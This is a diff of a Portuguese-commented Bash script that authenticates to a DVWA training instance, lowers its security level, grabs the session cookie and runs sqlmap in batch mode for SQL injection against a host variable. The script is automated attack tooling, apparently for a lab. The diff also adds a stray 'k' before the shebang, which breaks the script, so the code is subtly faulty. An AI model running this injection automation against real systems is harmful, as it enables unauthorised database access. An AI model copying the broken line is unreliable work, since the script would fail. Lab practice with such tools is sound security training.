@@ -1,4 +1,4 @@
-#!/bin/bash
+k#!/bin/bash
 
 # Play 03 — SQLMap DVWA em produção
 # Autentica no DVWA e roda sqlmap sem interatividade, seguindo automaticamente redirects
@@ -23,7 +23,7 @@ curl -s -b "$COOKIE_FILE" -L \
   "https://$TARGET_HOST/security.php?security=low" > /dev/null
 
 # 2. Extrai valor do PHPSESSID do cookie file
-PHPSESSID=$(grep -i 'PHPSESSID' "$COOKIE_FILE" | awk '{print \$7}')
+PHPSESSID=$(grep -i 'PHPSESSID' "$COOKIE_FILE" | awk '{print $7}')
 COOKIE="security=low; PHPSESSID=$PHPSESSID"
 
 # URL de injeção (usa HTTPS diretamente)
@@ -42,3 +42,4 @@ sqlmap --batch --answers="follow=Y" \
 
 # Mensagem de fim de teste
 echo "[✓] Análise SQLi concluída."
+
